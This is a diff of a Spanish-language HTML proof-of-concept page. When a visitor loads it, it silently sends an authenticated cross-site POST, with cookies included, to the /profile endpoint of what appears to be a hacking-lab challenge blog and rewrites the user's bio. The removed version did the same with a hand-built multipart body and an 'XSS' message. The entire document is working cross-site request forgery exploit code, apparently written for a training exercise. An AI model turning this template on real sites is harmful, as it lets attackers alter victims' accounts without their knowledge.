@@ -3,58 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Prueba de Concepto - POST con FormData</title>
 </head>
 <body>
-    <h1>Página de prueba</h1>
-    <p>El script se ejecutará automáticamente al cargar la página...</p>
+    <h1>Prueba de Concepto - Envío automático POST</h1>
+    <div id="resultado"></div>
 
     <script>
+        const TARGET_URL = 'https://chl-3cdf64d4-f1bc-47d5-8eba-d734ad55354d-blog-hacklab-v2.softwareseguro.com.ar';
+        
         window.addEventListener('load', function() {
-            // Crear el boundary (puede ser cualquier string único)
-            const boundary = '---------------------------' + Date.now() + Math.random().toString(36).substring(2);
-            
-            // Construir el cuerpo multipart/form-data
-            const bodyParts = [
-                `--${boundary}`,
-                'Content-Disposition: form-data; name="bio"',
-                '',
-                'XSS funciono el xss',
-                `--${boundary}`,
-                'Content-Disposition: form-data; name="profile_pic"; filename=""',
-                'Content-Type: application/octet-stream',
-                '',
-                '',
-                `--${boundary}--`,
-                ''
-            ];
-
-            const body = bodyParts.join('\r\n');
-
-            // Hacer la petición POST con headers mínimos
-            fetch('https://chl-60c90126-7eb6-4091-9a75-f3f19ec79c09-blog-hacklab-v2.softwareseguro.com.ar/profile', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': `multipart/form-data; boundary=${boundary}`
-                },
-                credentials: 'include',
-                body: body
-            })
-            .then(response => {
-                console.log('✅ Petición POST enviada. Status:', response.status);
-                if (response.redirected) {
-                    window.location.href = response.url;
-                }
-                return response.text();
-            })
-            .then(data => {
-                console.log('📝 Respuesta recibida del servidor');
-                alert('XSS ejecutado correctamente');
-            })
-            .catch(error => {
-                console.log('❌ Error:', error);
-            });
+            enviarPeticionFormData();
         });
+
+        async function enviarPeticionFormData() {
+            const formData = new FormData();
+            formData.append('bio', 'qweqwe');
+            formData.append('profile_pic', new Blob(), ''); // Archivo vacío
+
+            try {
+                console.log('📤 Enviando POST con FormData a:', `${TARGET_URL}/profile`);
+                
+                const response = await fetch(`${TARGET_URL}/profile`, {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
+                        'Origin': TARGET_URL,
+                        'Referer': `${TARGET_URL}/profile`,
+                        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0'
+                        // NOTA: No establecemos Content-Type manualmente con FormData
+                        // El navegador lo establecerá automáticamente con el boundary correcto
+                    },
+                    body: formData,
+                    credentials: 'include'
+                });
+
+                mostrarResultado(response);
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                document.getElementById('resultado').innerHTML = `
+                    <h3>❌ Error de conexión</h3>
+                    <p>${error.message}</p>
+                `;
+            }
+        }
+
+        async function mostrarResultado(response) {
+            const resultadoDiv = document.getElementById('resultado');
+            const status = response.status;
+            
+            try {
+                const text = await response.text();
+                
+                resultadoDiv.innerHTML = `
+                    <div style="border: 2px solid ${status === 200 ? 'green' : 'orange'}; padding: 15px; margin: 10px;">
+                        <h3>${status >= 200 && status < 300 ? '✅ ÉXITO' : '⚠️ RESPUESTA'} - Status: ${status}</h3>
+                        <p><strong>URL:</strong> ${response.url}</p>
+                        <details>
+                            <summary>Ver respuesta completa</summary>
+                            <pre style="background: #f5f5f5; padding: 10px; overflow: auto; max-height: 300px;">${escapeHtml(text)}</pre>
+                        </details>
+                    </div>
+                `;
+            } catch (error) {
+                resultadoDiv.innerHTML = `
+                    <h3>❌ Error al leer respuesta</h3>
+                    <p>Status: ${status}</p>
+                `;
+            }
+        }
+
+        function escapeHtml(unsafe) {
+            return unsafe
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
     </script>
 </body>
 </html>
